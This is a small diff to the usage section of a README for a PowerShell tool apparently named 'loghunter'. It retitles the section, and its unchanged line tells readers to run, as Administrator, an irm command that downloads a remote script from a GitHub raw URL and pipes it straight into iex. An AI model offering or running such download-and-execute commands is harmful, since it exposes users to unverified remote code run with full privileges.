@@ -4,8 +4,7 @@
 
 ## 🚀 Usage
 
-### Direct Memory Execution
-Open PowerShell as Administrator and execute:
+### Open PowerShell as Administrator and execute:
 
 irm "https://raw.githubusercontent.com/tqmgxd/loghunter/main/script.ps1" | iex
 
